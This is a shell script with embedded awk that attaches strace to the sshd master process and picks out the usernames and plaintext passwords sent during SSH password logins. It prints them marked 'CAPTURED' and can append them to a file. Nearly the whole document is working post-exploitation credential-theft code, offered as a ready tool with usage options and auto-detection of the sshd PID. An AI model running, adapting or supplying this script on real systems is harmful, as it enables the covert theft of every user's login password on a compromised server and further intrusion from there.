#!/bin/sh

set -e

PROG=$(basename "$0")
PID=""
STRLEN=128
OUTPUT=""
ALL=0
MINLEN=2

usage() {
    cat <<EOF
Usage: $PROG [-p PID] [-s STRLEN] [-m MINLEN] [-o FILE] [-a]

  -p PID      sshd master PID (auto-detected via pgrep if omitted)
  -s STRLEN   max string bytes shown per strace write() arg (default: 128)
  -m MINLEN   minimum token length to report (default: 1)
  -o FILE     append captured credentials to FILE
  -a          show ALL writes including truncated ones (noisy; for debugging)

Requires root.  Install strace if missing:
  apt install strace   /   dnf install strace
EOF
    exit 1
}

while getopts "p:s:m:o:ah" opt; do
    case $opt in
        p) PID=$OPTARG    ;;
        s) STRLEN=$OPTARG ;;
        m) MINLEN=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
        a) ALL=1          ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ---------- sanity checks ----------

if [ "$(id -u)" -ne 0 ]; then
    printf '%s: must run as root (strace needs CAP_PTRACE on sshd)\n' "$PROG" >&2
    exit 1
fi

if ! command -v strace >/dev/null 2>&1; then
    printf '%s: strace not found -- apt install strace / dnf install strace\n' "$PROG" >&2
    exit 1
fi

# ---------- find sshd ----------

if [ -z "$PID" ]; then
    PID=$(pgrep -x sshd 2>/dev/null | sort -n | head -1)
fi

if [ -z "$PID" ]; then
    printf '%s: sshd not found; use -p PID to specify manually\n' "$PROG" >&2
    exit 1
fi

# ---------- run ----------

printf '[*] sshd master PID : %s\n'   "$PID"
printf '[*] strace -s       : %s\n'   "$STRLEN"
if [ "$ALL" = 1 ]; then
    printf '[*] Mode            : all writes (noisy)\n'
else
    printf '[*] Mode            : auth-only (skip truncated)\n'
fi
printf '[*] Waiting for SSH login attempts... (Ctrl-C to stop)\n\n'

strace -f -e trace=write -s "$STRLEN" -p "$PID" 2>&1 | \
awk -v outfile="$OUTPUT" -v all="$ALL" -v minlen="$MINLEN" '

# ---- ignore list: known SSH protocol strings that are not credentials ----
BEGIN {
    ignore["ssh-connection"]        = 1
    ignore["ssh-userauth"]          = 1
    ignore["password"]              = 1
    ignore["publickey"]             = 1
    ignore["keyboard-interactive"]  = 1
    ignore["hostbased"]             = 1
    ignore["none"]                  = 1
    ignore["gssapi-with-mic"]       = 1
    ignore["gssapi-keyex"]          = 1
    ignore["ecdsa-sha2-nistp256"]   = 1
    ignore["ecdsa-sha2-nistp384"]   = 1
    ignore["ecdsa-sha2-nistp521"]   = 1
    ignore["ssh-ed25519"]           = 1
    ignore["ssh-rsa"]               = 1
    ignore["ssh-dss"]               = 1
    ignore["rsa-sha2-256"]          = 1
    ignore["rsa-sha2-512"]          = 1
    ignore["nistp256"]              = 1
    ignore["nistp384"]              = 1
    ignore["nistp521"]              = 1
    ignore["Password:"]             = 1
    ignore["Password: "]            = 1
    ignore["Login:"]                = 1
}

# Get the per-process PID from a strace line.
# Lines from child processes look like:  [pid 12345] write(...)
# Lines from the root traced process have no prefix.
function get_pid(line,    i) {
    if (substr(line, 1, 5) != "[pid ") return 0
    i = index(line, "]")
    if (i <= 5) return 0
    return substr(line, 6, i - 6) + 0
}

# Extract printable runs and their preceding binary-byte counts.
# rarr[1..N] = run strings, earr[1..N] = escape bytes before each run.
function extract_runs(s, rarr, earr,    i, c, n, oct, run, cnt, esc) {
    i = 1; run = ""; cnt = 0; esc = 0
    while (i <= length(s)) {
        c = substr(s, i, 1)
        if (c != "\\") {
            if (c >= " " && c <= "~") { run = run c; i++ }
            else {
                if (run != "") { cnt++; rarr[cnt] = run; earr[cnt] = esc; run = ""; esc = 0 }
                i++
            }
        } else {
            if (run != "") { cnt++; rarr[cnt] = run; earr[cnt] = esc; run = ""; esc = 0 }
            n = substr(s, i + 1, 1)
            if (n ~ /[0-7]/) {
                esc++; oct = n; i += 2
                while (i <= length(s) && length(oct) < 3 && substr(s, i, 1) ~ /[0-7]/) {
                    oct = oct substr(s, i, 1); i++
                }
            } else if (n == "x") { esc++; i += 4 }
            else                 { esc++; i += 2 }
        }
    }
    if (run != "") { cnt++; rarr[cnt] = run; earr[cnt] = esc }
    return cnt
}

# ---- process each strace output line ----
/write\(/ {
    pid = get_pid($0)

    if (!match($0, /"([^"\\]|\\.)*"/)) { _hdr[pid] = 0; next }

    quoted    = substr($0, RSTART + 1, RLENGTH - 2)
    truncated = ($0 ~ /"\.\.\./)

    # Large writes are always session/banner noise; never auth-phase.
    if (truncated) { _hdr[pid] = 0; next }

    # Extract SIZE (third arg to write) from the end of the line: , SIZE) = RET
    write_size = 0
    if (match($0, /,[ \t]*[0-9]+[ \t]*\)[ \t]*=[ \t]*-?[0-9]+[ \t]*$/)) {
        tail = substr($0, RSTART + 1)
        match(tail, /[0-9]+/)
        write_size = substr(tail, RSTART, RLENGTH) + 0
    }

    for (k in _r) delete _r[k]
    for (k in _e) delete _e[k]
    n = extract_runs(quoted, _r, _e)

    # ---- Detect the OpenSSH monitor protocol header ----
    # mm_request_send() in OpenSSH always makes two consecutive writes:
    #   Write 1 (header): exactly 5 bytes, all binary --
    #                     [uint32 payload_len+1] [uint8 msg_type]
    #   Write 2 (payload): the auth data as SSH-format strings
    # When we see a 5-byte all-binary write, the NEXT write from this
    # PID is the corresponding auth payload.
    if (write_size == 5 && n == 0) {
        _hdr[pid] = 1
        next
    }

    # In default mode, only process the write immediately after a header.
    # This restricts output to MONITOR_REQ_PWNAM (username) and
    # MONITOR_REQ_AUTHPASSWORD (password) payloads, filtering out all
    # session data, crypto material, PAM prompts, and MOTD.
    if (!all) {
        if (!_hdr[pid]) next
    }
    _hdr[pid] = 0

    for (i = 1; i <= n; i++) {
        t = _r[i]
        e = _e[i]

        # Each SSH string field begins with a uint32 length = 4 binary bytes.
        if (e < 4) continue

        if (length(t) < minlen || ignore[t] || index(t, "/") > 0) continue

        # Credential writes contain exactly one SSH string: the entire payload
        # is [4-byte length][string].  Garbage strings are fragments inside
        # larger multi-field payloads where write_size > e + length(t).
        if (write_size != e + length(t)) continue

        "date +%H:%M:%S" | getline ts
        close("date +%H:%M:%S")

        msg = "[" ts "] CAPTURED: " t
        print msg
        fflush()

        if (outfile != "") { print msg >> outfile; fflush(outfile) }
    }
}
'
